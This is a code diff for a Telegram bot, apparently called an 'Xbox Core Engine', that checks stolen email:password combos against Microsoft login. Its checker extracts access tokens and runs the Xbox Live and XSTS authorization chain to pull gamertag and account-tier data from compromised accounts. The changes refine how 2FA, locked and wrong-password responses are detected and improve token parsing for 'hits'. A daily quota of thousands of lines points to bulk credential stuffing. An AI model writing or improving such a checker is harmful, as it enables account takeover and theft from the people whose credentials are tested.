@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
 """
-r1livk Elite Advanced Xbox & Microsoft Core Engine ⚡ - Telegram Bot
+r1livk Elite Advanced Xbox & Microsoft Core Engine ⚡ - Telegram Bot (Optimized Hit Logic)
 """
 
 import os
@@ -37,7 +37,7 @@ def load_json_data(filepath, default_val):
 def save_json_data(filepath, data):
     try:
         with open(filepath, "w", encoding="utf-8") as f:
-            json.dump(data, f, ensure_ascii=False, indent+4 if False else 4)
+            json.dump(data, f, ensure_ascii=False, indent=4)
     except:
         pass
 
@@ -70,7 +70,7 @@ def check_user_subscription(user_id, username=None):
         pass
     return False
 
-REQUEST_TIMEOUT = 10
+REQUEST_TIMEOUT = 12
 CONCURRENT_LIMIT = 4
 
 active_scans = {}
@@ -186,44 +186,55 @@ async def elite_check_account(combo):
             txt = login_res.text.lower()
             url = login_res.url.lower()
 
-            tfa_triggers = ["two-step", "additional security", "identity/confirm?m=", "proofs", "challenge/contact", "sendcode"]
+            tfa_triggers = ["two-step", "additional security", "identity/confirm?m=", "proofs", "challenge/contact", "sendcode", "device-auth"]
             if any(t in txt or t in url for t in tfa_triggers):
-                if "password is incorrect" not in txt:
+                if "password is incorrect" not in txt and "incorrect password" not in txt:
                     return "2fa", None
 
-            if any(x in txt for x in ["doesn't exist", "enter a valid email"]):
+            if any(x in txt for x in ["doesn't exist", "enter a valid email", "account doesn't exist"]):
                 return "bad", "Not Exist"
 
-            if any(x in txt for x in ["password is incorrect", "incorrect password"]):
+            if any(x in txt for x in ["password is incorrect", "incorrect password", "enter the password"]):
                 return "bad", "Wrong Password"
 
-            if "locked" in txt:
+            if "locked" in txt or "suspended" in txt:
                 return "bad", "Locked"
 
+            # استخراج الـ Access Token بدقة فائقة من الـ URL النهائي أو الـ History
             ms_token = None
-            if 'access_token=' in login_res.url:
-                parsed = urlparse(login_res.url)
-                frag = parse_qs(parsed.fragment)
-                if 'access_token' in frag:
-                    ms_token = frag['access_token'][0]
-
-            if not ms_token:
-                for hist in login_res.history:
-                    if 'access_token=' in hist.url:
-                        parsed = urlparse(hist.url)
+            
+            def search_token_in_string(s):
+                if 'access_token=' in s:
+                    try:
+                        parsed = urlparse(s)
                         frag = parse_qs(parsed.fragment)
                         if 'access_token' in frag:
-                            ms_token = frag['access_token'][0]
-                            break
+                            return frag['access_token'][0]
+                        query = parse_qs(parsed.query)
+                        if 'access_token' in query:
+                            return query['access_token'][0]
+                    except:
+                        pass
+                m = re.search(r'access_token=([^&\s\"\']+)', s)
+                if m:
+                    return m.group(1)
+                return None
+
+            ms_token = search_token_in_string(login_res.url)
+            
+            if not ms_token:
+                for hist in login_res.history:
+                    ms_token = search_token_in_string(hist.url)
+                    if ms_token:
+                        break
 
             if not ms_token:
-                m = re.search(r'access_token=([^&\s\"\']+)', login_res.text)
-                if m:
-                    ms_token = m.group(1)
+                ms_token = search_token_in_string(login_res.text)
 
             if not ms_token:
                 return "bad", "No Token"
 
+            # خطوة التوثيق الخاصة بـ Xbox Live
             xb_payload = {
                 "Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, 
                 "RelyingParty": "http://auth.xboxlive.com", 
@@ -235,25 +246,31 @@ async def elite_check_account(combo):
                 return "bad", "XBox Auth Denied"
 
             xb_json = xb_res.json()
-            xb_token = xb_json['Token']
-            uhs = xb_json['DisplayClaims']['xui'][0]['uhs']
+            xb_token = xb_json.get('Token')
+            xui = xb_json.get('DisplayClaims', {}).get('xui', [])
+            if not xb_token or not xui:
+                return "bad", "XBox Token Invalid"
+                
+            uhs = xui[0].get('uhs')
 
             xsts_payload = {
                 "Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, 
                 "RelyingParty": "http://xboxlive.com", 
                 "TokenType": "JWT"
             }
-            xsts_res = await session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_payload, timeout=5)
+            xsts_res = await session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_payload, timeout=REQUEST_TIMEOUT)
             
             if xsts_res.status_code != 200:
                 return "bad", "XSTS Failed"
 
-            xsts_token = xsts_res.json()['Token']
+            xsts_token = xsts_res.json().get('Token')
+            if not xsts_token:
+                return "bad", "XSTS Token Missing"
             
             prof_res = await session.get(
                 "https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,Gamerscore,AccountTier,TenureLevel", 
                 headers={"Authorization": f"XBL3.0 x={uhs};{xsts_token}", "x-xbl-contract-version": "2"}, 
-                timeout=5
+                timeout=REQUEST_TIMEOUT
             )
 
             gamertag = "N/A"
@@ -281,7 +298,7 @@ async def elite_check_account(combo):
             return "hit", {"content": hit_data}
 
     except Exception as e:
-        return "error", str(e)
+        return "bad", f"Error: {str(e)}"
 
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
@@ -367,8 +384,8 @@ def show_main_menu(message):
         status_text = f"👤 Free ({used}/5000 lines today)"
 
     text = (
-        "⚡ **r1livk Elite Xbox Core Engine - V5.0** ⚡\n\n"
-        "Engine upgraded with advanced pipeline endpoints.\n"
+        "⚡ **r1livk Elite Xbox Core Engine - V5.1** ⚡\n\n"
+        "Engine upgraded with advanced pipeline endpoints & improved hit parsing.\n"
         f"Your Status: {status_text}\n\n"
         "Select an option:"
     )
